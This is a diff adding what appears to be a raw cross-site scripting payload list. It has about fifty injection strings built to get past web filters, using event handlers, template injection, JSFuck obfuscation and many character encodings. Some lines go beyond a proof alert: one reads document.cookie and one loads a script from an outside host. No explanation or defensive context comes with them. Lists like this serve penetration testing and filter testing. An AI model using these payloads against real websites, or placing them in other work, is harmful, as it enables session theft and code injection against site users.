@@ -1,0 +1,52 @@
+<IMG/SRC/ONERROR=ALERT(5)>
+window[['a'][0] + 'lert'](1337)
+<? #a="><style/onload=\u0061lert`1`>">
+"mitsec<form/><!><details/open/ontoggle=alert(document.domain)>"@gmail.com
+["');alert('XSS');//"]@xyz.xxx
+<button/onclick="confirm(document.domain+document.cookie)">CLICK</button>
+<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
+x"><x a="><script>alert(1)</script>
+"<img/src/onerror=alert(0)"@xss.com
+{{constructor.constructor('alert(1)')()}} 
+<img src='bla' onerror=alert("XSS")>
+"  onload="alert(String.fromCharCode(88,83,83))
+<a href="data:text/html;charset=utf-7;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=">Click Here</a> 
+<a href="data:text/html;charset=utf-8;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=">Click Here</a> 
+data:text/html;charset=utf-7;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4= (PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=) : <script>alert('XSS')</script>
+<img/src/onerror=(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]]>
+" onload="alert('XSS')
+onmouseover=javascript:window.onerror=alert;throw[1] c=
+<img/SRc/oneRRoR=aleRt(5)><img/SRc/oneRRoR=aleRt(5)>
+s=document.createElement`script`;
+s.src="//path.to/external.js";
+document["body"].append`${s}` 
+%3Cimg%2Fsrc%2Fonerror%3Dalert%285%29%3E
+&lt;img/src/onerror=alert(5)&gt;
+<img/src/onerror=alert(5)><img/src/onerror=alert(5)>
+3c696d672f7372632f6f6e6572726f723d616c6572742835293e
+b'\xff\xfe<\x00i\x00m\x00g\x00/\x00s\x00r\x00c\x00/\x00o\x00n\x00e\x00r\x00r\x00o\x00r\x00=\x00a\x00l\x00e\x00r\x00t\x00(\x005\x00)\x00>\x00'
+b'\xff\xfe\x00\x00<\x00\x00\x00i\x00\x00\x00m\x00\x00\x00g\x00\x00\x00/\x00\x00\x00s\x00\x00\x00r\x00\x00\x00c\x00\x00\x00/\x00\x00\x00o\x00\x00\x00n\x00\x00\x00e\x00\x00\x00r\x00\x00\x00r\x00\x00\x00o\x00\x00\x00r\x00\x00\x00=\x00\x00\x00a\x00\x00\x00l\x00\x00\x00e\x00\x00\x00r\x00\x00\x00t\x00\x00\x00(\x00\x00\x005\x00\x00\x00)\x00\x00\x00>\x00\x00\x00'
+";alert('1XSS');//
+%uff1cimg/src/onerror=alert(5)%uff1e
+¼img/src/onerror=alert(5)¾
+PGltZy9zcmMvb25lcnJvcj1hbGVydCg1KT4=
++ADw-img/src/onerror=alert(5)+AD4-
+<img/src/onerror=alert`5`><img/src/onerror=alert`5`>
+%C0%BCimg/src/onerror=alert%CA%B95)%C0%BE
+"><img/src/onerror=alert(5)>
+"><img/src/onerror=alert(5)>">"><img/src/onerror=alert(5)>">
+</script><img/src/onerror=alert(5)>
+"><img/src/onerror=alert(5)>.gif
+<!--><img/src/onerror=alert(5)>-->
+<noscript><p title="</noscript><img/src/onerror=alert(5)>">
+<IMG """><img/src/onerror=alert(5)>">
+<img/src/onerror=alert(5)>
+<!--[if gte IE 4]><img/src/onerror=alert(5)><![endif]-->
+'"><img/src/onerror=prompt()>
+java%26Tab%3bscript:ale%26Tab%3brt()
+<iframe src=javascript:alert(3)//>
+"hello<form/><!><details/open/ontoggle=alert(1)>"@gmail.com
+%26jsonp=alert(1337);%23
+<dialog open onclose = prompt(1337)><form method=dialog><button>XSS</button></form>
+<s<script>cript>alert(1)</s<script>cript>
+</title></textarea></style></noscript></script></xmp></template></noembed><svg/onload=alert(50)>
